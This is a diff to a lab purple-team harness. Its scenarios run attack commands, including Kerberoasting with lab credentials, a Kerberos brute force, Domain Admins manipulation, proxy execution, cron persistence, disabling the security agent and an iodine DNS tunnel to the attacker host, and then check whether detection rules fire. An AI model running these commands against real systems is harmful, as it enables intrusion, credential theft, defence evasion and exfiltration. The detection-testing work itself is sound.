@@ -59,8 +59,15 @@ SCENARIOS = [
         "desc": "one password x many accounts -> burst rule (T1110.003)",
     },
     {
+        # settle bumped 25->35 (2026-09-13): observed one flaky FAIL (hits=0) in an
+        # otherwise-clean full battery run, immediately reproduced as a clean PASS on a
+        # manual re-run seconds later with no code change — impacket's 4 sequential
+        # TGS-REQs against Samba (already documented as slower than against real AD,
+        # see ATTACK_TIMEOUT above) occasionally needs more than 25s to fully land and
+        # correlate. Not a rule defect; a timing margin.
         "name": "Kerberoasting",
         "host": "atk-01",
+        "settle": 35,
         "cmd": ("impacket-GetUserSPNs lab.internal/svc-sql:Summer2026 -dc-ip 10.10.10.10 -request"),
         "rules": ["100031"],
         "technique": "T1558.003",
@@ -82,6 +89,7 @@ SCENARIOS = [
         "cmd": ("smbclient //10.10.10.20/public -U 'lab.internal\\svc-sql%Summer2026' "
                 "-c 'get map-backup-share.ps1 /tmp/loot.ps1'"),
         "rules": ["100090"],
+        "technique": "T1552.001",
         "desc": "read planted credential file on the weak share (T1552.001)",
     },
     # --- Added 2026-09-06: inbound attacks that can only be validated from the
@@ -162,6 +170,253 @@ SCENARIOS = [
         "technique": "T1560.001",
         "desc": "Compress-Archive stages a fileless archive on ws-01 (T1560.001)",
     },
+    {
+        # ART's own T1218.005 atomics use vbscript/javascript monikers that error at the
+        # harness's own .Start() call (documented in detection-catalog.md's T1218 batch);
+        # verified instead by invoking mshta directly with the same minimal moniker the
+        # original manual verification used (`mshta vbscript:close` exits 0 cleanly — no
+        # Access-Denied, no hang). Wait-Process -Timeout is a hard backstop in case a
+        # future Windows build ever makes this hang instead of exiting.
+        "name": "Mshta Proxy Execution",
+        "host": "ws-01",
+        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
+                "$p = Start-Process mshta.exe -ArgumentList vbscript:close -PassThru; "
+                "Wait-Process -InputObject $p -Timeout 5 -ErrorAction SilentlyContinue; "
+                'if (-not $p.HasExited) { Stop-Process $p -Force }"'),
+        "rules": ["100116"],
+        "technique": "T1218.005",
+        "desc": "mshta vbscript: moniker, direct invocation (T1218.005)",
+    },
+    {
+        # T1218.011's ART atomics are the same story, one worse: test 2 (rundll32 VBScript
+        # command) actually crashed the SSH/WinRM session outright when run through
+        # Invoke-AtomicTest (found live 2026-09-12 rebuilding this battery — see
+        # tests.json's comment). Same direct-invocation fix as mshta above.
+        "name": "Rundll32 Proxy Execution",
+        "host": "ws-01",
+        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
+                "$p = Start-Process rundll32.exe -ArgumentList vbscript:close -PassThru; "
+                "Wait-Process -InputObject $p -Timeout 5 -ErrorAction SilentlyContinue; "
+                'if (-not $p.HasExited) { Stop-Process $p -Force }"'),
+        "rules": ["100115"],
+        "technique": "T1218.011",
+        "desc": "rundll32 vbscript: moniker, direct invocation (T1218.011)",
+    },
+    # --- Added 2026-09-12/13: closing the 23->51 coverage gap. Every scenario below was
+    # verified live before being written here (never declared-then-assumed — see the
+    # purple-team README's "declared before verified" gotcha). Several needed the new
+    # setup/teardown fields above because the technique itself needs a throwaway account
+    # or a background daemon that isn't the thing being measured.
+    {
+        # A REAL empirical finding, not an assumption: a LOCAL (root-shell) samba-tool
+        # group addmembers call prints the same "Group Change [Added]..." audit text to
+        # its own stdout, but that text never reaches /var/log/samba/log.samba — verified
+        # by watching the file's line count across a local call (unchanged) and a
+        # `-H ldap://` network call (jumped by 6 lines, with a real remoteAddress). This
+        # is likely WHY the original detection-catalog.md investigation's phrase "the real
+        # remote-LDAP path (not a local shortcut)" mattered: it isn't just about realism,
+        # a local CLI call genuinely never reaches the audit log at all, at any log level.
+        # So the attack step here forces the network path explicitly with -H, using a
+        # throwaway admin bootstrapped (and deleted) via the local/root path, which is
+        # fine for setup since bootstrap isn't what's being measured.
+        "name": "AD Group Membership Manipulation",
+        "setup": {"host": "dc-01",
+                   "cmd": ("sudo samba-tool user create adm-test 'AdmTest2026!' >/dev/null 2>&1; "
+                           "sudo samba-tool group addmembers 'Domain Admins' adm-test >/dev/null 2>&1")},
+        "host": "dc-01",
+        "cmd": ("samba-tool group addmembers 'Domain Admins' jdoe -H ldap://10.10.10.10 "
+                "-U adm-test%'AdmTest2026!'"),
+        "teardown": {"host": "dc-01",
+                      "cmd": ("sudo samba-tool group removemembers 'Domain Admins' jdoe >/dev/null 2>&1; "
+                              "sudo samba-tool user delete adm-test >/dev/null 2>&1")},
+        "rules": ["100015"],
+        "technique": "T1098.007",
+        "desc": "add jdoe to Domain Admins over real network LDAP with a throwaway admin (T1098.007)",
+    },
+    {
+        # Throwaway account, not jdoe/svc-web: rule 100041 has a LIVE active-response
+        # (disable-ad-account.py) that disables the targeted account for 600s — harmless
+        # on a disposable account, disruptive on one other scenarios rely on.
+        # settle bumped 25->35 (2026-09-13): the full battery's own run reported a FAIL
+        # here (hits=0), but the alert had genuinely fired — just ~1-13s after the 25s
+        # check, confirmed by finding it in alerts.json moments later. Same class of
+        # timing margin as Kerberoasting below: the frequency=4/timeframe=60 correlation
+        # rule occasionally needs a few extra seconds to settle, not a rule defect.
+        "name": "Kerberos Brute Force",
+        "setup": {"host": "dc-01", "cmd": "sudo samba-tool user create pt-kbrute 'Init2026zQ!' >/dev/null 2>&1"},
+        "host": "atk-01",
+        "settle": 35,
+        "cmd": "for i in 1 2 3 4; do echo wrongpass$i | kinit pt-kbrute@LAB.INTERNAL 2>/dev/null; done; true",
+        "teardown": {"host": "dc-01", "cmd": "sudo samba-tool user delete pt-kbrute >/dev/null 2>&1"},
+        "rules": ["100041"],
+        "technique": "T1110.001",
+        "desc": "4 wrong-password kinit attempts against a throwaway account in 60s (T1110.001)",
+    },
+    {
+        "name": "SYSVOL Integrity Tampering",
+        "host": "dc-01",
+        "cmd": ("sudo touch /var/lib/samba/sysvol/lab.internal/scripts/pt-test.bat && "
+                "echo 'echo test' | sudo tee -a /var/lib/samba/sysvol/lab.internal/scripts/pt-test.bat "
+                ">/dev/null && sudo rm -f /var/lib/samba/sysvol/lab.internal/scripts/pt-test.bat"),
+        "rules": ["100020"],
+        "technique": "T1484.001",
+        "desc": "add/modify/delete a SYSVOL logon-script file on dc-01 (T1484.001)",
+    },
+    {
+        "name": "Cron Persistence",
+        "host": "dc-01",
+        "cmd": "echo '# purple-team test cron' | sudo tee /etc/cron.d/pt-cron-test >/dev/null && sudo rm -f /etc/cron.d/pt-cron-test",
+        "rules": ["100050"],
+        "technique": "T1053.003",
+        "desc": "add/delete a disguised cron job under /etc/cron.d on dc-01 (T1053.003)",
+    },
+    {
+        # KNOWN LIMITATION, root-caused not papered over (2026-09-13): this PASSES exactly
+        # once per wazuh-agent lifetime on dc-01, then reliably FAILs on every rerun until
+        # the agent restarts (or its 12h periodic scan runs) — a real gap in rule 100051,
+        # not a flaky test. useradd/userdel replace /etc/passwd+shadow via write-new-
+        # tempfile-then-rename (standard shadow-utils practice), which silently orphans
+        # the inotify-based `realtime` FIM watch (it tracks the old inode, now unlinked).
+        # 100020 (SYSVOL) and 100050 (cron) don't have this problem — their scenarios only
+        # touch/tee/rm the same inode in place. See detection-catalog.md's T1136.001
+        # section for the full before/after evidence. Deliberately NOT fixed by forcing an
+        # agent restart before this scenario runs — that would hide a real, worth-knowing
+        # detection gap behind a green checkmark.
+        "name": "Local Account Creation",
+        "host": "dc-01",
+        "cmd": "sudo useradd -m pt-account-test && sudo userdel -r pt-account-test",
+        "rules": ["100051"],
+        "technique": "T1136.001",
+        "desc": "useradd/userdel a local Linux account on dc-01 (T1136.001, writes passwd+shadow)",
+    },
+    {
+        # Deliberately `disable`, not `stop` — an agent that's just been killed can't
+        # report that it was killed. See detection-catalog.md's T1562.001 section.
+        "name": "Security Tooling Disruption",
+        "host": "dc-01",
+        "cmd": "sudo systemctl disable wazuh-agent; sudo systemctl enable wazuh-agent",
+        "rules": ["100060"],
+        "technique": "T1562.001",
+        "desc": "systemctl disable/re-enable the Wazuh agent on dc-01 (T1562.001)",
+    },
+    {
+        # Doesn't need a real credential — rule 100119 is a Sysmon command-line match on
+        # ws-01 itself (the process spawns regardless of whether the auth succeeds).
+        "name": "SMB Admin Share Access",
+        "host": "ws-01",
+        "cmd": ('powershell -ExecutionPolicy Bypass -NoProfile -c "'
+                "net use \\\\10.10.10.10\\C$ /user:lab.internal\\jdoe WrongPassTest123 2>&1; "
+                'net use \\\\10.10.10.10\\C$ /delete 2>&1"'),
+        "rules": ["100119"],
+        "technique": "T1021.002",
+        "desc": "attempt a UNC admin-share mapping from ws-01 to dc-01 (T1021.002)",
+    },
+    {
+        "name": "Automated Scanner Detection",
+        "host": "atk-01",
+        "cmd": ("curl -sk --max-time 10 -A 'sqlmap/1.7.2#stable (http://sqlmap.org)' "
+                f"-o /dev/null \"{DMZ_WEB}/\""),
+        "rules": ["100441"],
+        "technique": "T1595.002",
+        "desc": "request the DMZ app with a known scanner User-Agent (T1595.002)",
+    },
+    {
+        # The honeytoken fires on ANY interaction as svc-sqladmin regardless of outcome —
+        # a wrong password is enough (no real credential needed, nobody legitimately
+        # knows one). See phase-4-detection/deception/.
+        "name": "Honeytoken Authentication",
+        "host": "atk-01",
+        "cmd": "nxc smb 10.10.10.10 -u svc-sqladmin -p 'WrongPass123!'",
+        "rules": ["100421"],
+        "technique": "T1078",
+        "desc": "authenticate as the svc-sqladmin decoy account (T1078 honeytoken tripwire)",
+    },
+    {
+        # Requires fs-01. Backs up/restores the real seeded decoy file rather than
+        # deleting it, so the canary stays intact for the next run.
+        "name": "Ransomware Canary Tampering",
+        "host": "fs-01",
+        "requires": "fs-01",
+        "cmd": ("sudo cp /srv/finance-records/Q3-Financials-2026.csv /tmp/.pt-canary-backup && "
+                "echo purple-team-canary-test | sudo tee -a /srv/finance-records/Q3-Financials-2026.csv "
+                ">/dev/null && sleep 2 && sudo cp /tmp/.pt-canary-backup /srv/finance-records/Q3-Financials-2026.csv "
+                "&& sudo rm -f /tmp/.pt-canary-backup"),
+        "rules": ["100430"],
+        "technique": "T1486",
+        "desc": "tamper with then restore a ransomware-canary decoy file on fs-01 (T1486)",
+    },
+    {
+        # One process, three techniques (honestly cross-referenced by generate-coverage.py
+        # off rule 100200's own <mitre> tags, not claimed here): a copy of /bin/dash run
+        # from /tmp is exactly the "process executing from a world-writable path" the
+        # susp-exec-path collector polls for every 30s (phase-5-offense/sliver-c2/). Copy
+        # dash specifically, not a uutils-coreutils applet like sleep/cat — those are
+        # multicall binaries that dispatch on argv[0], so a renamed copy just errors with
+        # "unknown program" (found live, 2026-09-12). systemd-run --scope blocks in the
+        # foreground until the process exits, which is fine here — the harness already
+        # waits out the whole attack step before checking for the alert.
+        "name": "Suspicious Execution From World-Writable Path",
+        "host": "fs-01",
+        "requires": "fs-01",
+        "settle": 35,
+        "cmd": ("sudo cp /bin/dash /tmp/.pt-implant && "
+                "sudo systemd-run --unit=pt-implant-test --scope --quiet --collect -- "
+                "/tmp/.pt-implant -c 'sleep 35'; sudo rm -f /tmp/.pt-implant"),
+        "rules": ["100200"],
+        "technique": "T1204.002",
+        "desc": "run a copy of dash from /tmp on fs-01 for 35s (T1204.002/T1059.004/T1071.001)",
+    },
+    {
+        # 9100002 (Suricata) fires on 10+ SYNs to REDTEAM:443 in 60s regardless of TLS/JA3
+        # — no Sliver binary needed to exercise the same behavioural signature a beacon
+        # produces. dest_ip=atk-01 is on the threat-intel CDB list, so this is the ONE
+        # scenario that gives 100210 (not 100440/100443, which structurally always
+        # outrank it on their own events) the winning, undisputed match — see the T1190
+        # field note in local_rules.xml for why an equal/lower-level sibling never
+        # surfaces on a shared event.
+        "name": "C2 Beaconing Pattern",
+        "host": "fs-01",
+        "requires": "fs-01",
+        "cmd": "for i in $(seq 1 15); do curl -sk --max-time 2 https://10.10.40.119:443/ >/dev/null 2>&1; done",
+        "rules": ["100210"],
+        "technique": "T1071",
+        "desc": "15 rapid connections from fs-01 to atk-01:443 in <60s (T1071 beaconing pattern)",
+    },
+    {
+        # Real iodine tunnel (not a stand-in) — see phase-6-nsm/dns-tunneling.md. iodined
+        # is setup/teardown (a prerequisite daemon, not the measured technique); the
+        # client + 20 pings on fs-01 is the attack step. --unit (not --scope) so the
+        # setup/teardown steps return immediately instead of blocking on the daemon.
+        # `-f` (foreground) on BOTH ends is load-bearing, not cosmetic: iodine(d) self-
+        # daemonizes by default (forks, prints "Detaching from terminal...", and the
+        # ORIGINAL process exits) — found live 2026-09-13 when a first pass without `-f`
+        # had the tunnel work fine by hand but silently fail under systemd-run --unit,
+        # because a transient service's default KillMode=control-group treats "tracked
+        # main PID exited" as "service stopped" and kills the whole cgroup, taking the
+        # just-detached daemon child down with it a fraction of a second after it starts
+        # (confirmed via `journalctl -u pt-iodined`: "Detaching from terminal..." then
+        # "Deactivated successfully." within the same tick). `-f` keeps iodine(d) in the
+        # foreground as systemd's actual tracked process, so the unit stays genuinely
+        # "active (running)" for as long as the tunnel needs to exist.
+        "name": "DNS Tunneling",
+        "setup": {"host": "atk-01",
+                   "cmd": ("sudo pkill -9 iodined >/dev/null 2>&1; "
+                           "sudo systemd-run --unit=pt-iodined --quiet --collect -- "
+                           "iodined -f -c -P purpleteam2026 10.8.0.1 t.exfil-lab.net >/dev/null 2>&1")},
+        "host": "fs-01",
+        "requires": "fs-01",
+        "cmd": ("sudo pkill -9 iodine >/dev/null 2>&1; sleep 1; "
+                "sudo systemd-run --unit=pt-iodine-client --quiet --collect -- "
+                "iodine -f -r -P purpleteam2026 10.10.40.119 t.exfil-lab.net >/dev/null 2>&1; "
+                "sleep 5; ping -c 20 -i 0.2 -W2 10.8.0.1 >/dev/null 2>&1"),
+        "teardown": [
+            {"host": "fs-01", "cmd": "sudo systemctl stop pt-iodine-client >/dev/null 2>&1; sudo pkill -9 iodine >/dev/null 2>&1"},
+            {"host": "atk-01", "cmd": "sudo systemctl stop pt-iodined >/dev/null 2>&1; sudo pkill -9 iodined >/dev/null 2>&1"},
+        ],
+        "rules": ["100443"],
+        "technique": "T1048.003",
+        "desc": "a real fs-01->atk-01 iodine DNS tunnel carrying 20 pings (T1048.003/T1071.004)",
+    },
 ]
 
 
@@ -175,6 +430,24 @@ def ssh(host, cmd, timeout=90):
 
 def reachable(host):
     return ssh(host, "echo up", timeout=20).stdout.strip() == "up"
+
+
+def run_steps(steps):
+    # setup/teardown: a scenario dict, or a list of them, run on their own host(s) and
+    # NOT counted toward the before/after delta — bootstrapping a throwaway account or
+    # starting/stopping a background daemon (iodined) isn't itself the technique being
+    # measured. Best-effort: a failed step is logged, never raised, so a broken teardown
+    # can't mask whether the actual attack/detection worked, and a scenario's cleanup
+    # always runs to completion even if one of several steps errors.
+    if not steps:
+        return
+    if isinstance(steps, dict):
+        steps = [steps]
+    for step in steps:
+        r = ssh(step["host"], step["cmd"], timeout=ATTACK_TIMEOUT)
+        if r.returncode not in (0, None) and step.get("must_succeed"):
+            print(f"    [setup/teardown WARNING] {step['host']}: {step['cmd'][:60]}... "
+                  f"exit={r.returncode} stderr={r.stderr.strip()[:200]}")
 
 
 def count_rules(rule_ids):
@@ -202,12 +475,14 @@ def main():
             print(f"  [SKIP] {s['name']:17} needs {'/'.join(missing)} env var(s)   {s['desc']}")
             results.append((s["name"], None))
             continue
+        run_steps(s.get("setup"))
         before = count_rules(s["rules"])
         t0 = time.time()
         ssh(s["host"], s["cmd"], timeout=ATTACK_TIMEOUT)
-        time.sleep(SETTLE)
+        time.sleep(s.get("settle", SETTLE))
         delta = count_rules(s["rules"]) - before
         latency = round(time.time() - t0, 1)
+        run_steps(s.get("teardown"))
         ok = delta > 0
         results.append((s["name"], ok))
         print(f"  [{'PASS' if ok else 'FAIL'}] {s['name']:17} "
